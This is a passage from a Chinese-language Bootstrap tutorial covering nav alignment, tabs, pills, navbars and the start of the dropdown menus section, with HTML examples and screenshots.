      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93d9055c9d6548dd87e46bd02702c0b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=cEfYcUAncG2lRMuFrsURx5CUZcc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-127">导航对齐</h3>
<p>默认情况下导航是左对齐，我们可以使用flexbox为导航添加对其方式。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav justify-content-center"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a9ba8a79e1d4d0093fcdcad102493f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=TMQsyGW7NcUfhmFR08eOizQowDs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-128">垂直导航</h3>
<p>我们可以通过<code>.flex-column</code>将导航变成垂直导航。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav flex-column"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3f00b3c8d4b480c95fe7a6e5e38d807~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=DON%2F2mpzLnaI1nOQwzN8Psfit0Y%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-129">选项卡</h3>
<p>可以使用<code>.nav-tabs</code>来为我们导航栏生成选项卡式导航，并将<code>.active</code>类添加到活动选项中。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav nav-tabs"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item active"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/779c354b89874e8fb579955d8bb45781~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=V904puNef08nm1%2BTjcom8BQfJsE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-130">创建Pills导航</h3>
<p>通过<code>.nav-pills</code>来创建基于Pills的导航。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav nav-pills"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link active"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/532d42a342204903b80bfb5f3b629a93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=ES24RDjjONIq9EODmjWlpYq7GaQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-131">等宽的选项卡</h3>
<p>通过<code>.nav-justified</code>对齐标签/胶囊，让标签式或胶囊式的导航菜单与父元素等宽。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav nav-pills nav-justified"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link active"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b70eb76b4d414bbd818c198316d5fabe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=6tPrll9oor96f%2Fh8Cuj1rHr%2BEFo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-132">Bootstrap 导航栏</h2>
<p>Bootstrap 导航栏组件是为网站或应用程序创建响应式导航标题，这些响应式导航通常在手机等小视口的设备上会折叠，在大型和中型设备中将正常显示为水平。</p>
<h3 data-id="heading-133">基础的导航栏</h3>
<p>通过<code>.navbar</code>创建一个标准的导航栏，还可以在导航栏元素上添加<code>.navbar-expand-*</code>来创建响应式导航栏。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar navbar-expand-lg"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-nav"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link active"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e0546f94d5f4b47bebb57ee8cc9511a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=%2FnqbEDkKHzXMbSg8Zoq1OA2K7qc%3D" alt="" loading="lazy"/></p>
<p>当视口小于992px时：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4daa9859e2484937a7112824fdf7bcde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=LUrlfg1WR7ccPJYYF3%2F8uFq1rlM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-134">垂直导航栏</h3>
<p>我们可以通过删除<code>.navbar-expand-*</code>来创建失踪垂直的导航栏：</p>
<pre><code class="hljs language-html" lang="html"> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-135">导航栏颜色</h3>
<p>我们可以通过<code>.bg-color</code>直接来更改导航栏的背景色，<code>.navbar-dark</code>为导航栏所有链接添加白色文本文字或使用<code>.navbar-light</code>添加黑色文本颜色。</p>
<h3 data-id="heading-136">品牌/标志</h3>
<p>我们可以通过<code>.navbar-brand</code>用于突出显示页面的品牌/标志/项目名称。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container navbar"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-nav"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-brand"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Polaris<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dce9a1dbf98a4d2ea1de5f31a697ad57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=QCgpxu1wMVq7rP8eQ88BPmxtkzg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-137">固定导航栏</h3>
<p>导航栏也可以固定到页面顶部或底部。我们可以通过<code>.flxed-top</code>和<code>.flxed-bottom</code>来设置导航停留在顶部还是停留在底部。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container navbar flxed-top"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-nav"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-brand"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Polaris<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c8f6bb752d54b50ad4dc8dd5bbc1c41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=ixYmB6uYCqm1z9FN5HE%2FRSor7xw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-138">导航栏粘在顶部</h3>
<p>通过<code>.sticky-top</code>来创建随页面滚动直到达顶部后如何停留在那里的粘性顶部导航栏。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container navbar navbar-expand-lg sticky-top"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-nav"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"navbar-brand"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Polaris<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"nav-link"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>Bootstrap<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h2 data-id="heading-139">Bootstrap 下拉菜单</h2>
<p>下拉菜单常用于导航标题中，在用户悬停或点击时出发显示相关内容。</p>
<h3 data-id="heading-140">基础下拉菜单</h3>
<p>我们可以通过<code>.dropdown</code>来定义下拉菜单，使用<code>.dropdown-toggle</code>定义触发元素，而触发器上需要属性<code>data-bs-toggle="dropdown"</code>来切换菜单，带有<code>.dropdown-menu</code>类的元素可构建下拉菜单。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown m-4"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary dropdown-toggle"</span> <span class="hljs-attr">data-bs-toggle</span>=<span class="hljs-string">"dropdown"</span>&gt;</span>下拉<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-menu"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"dropdown-item"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
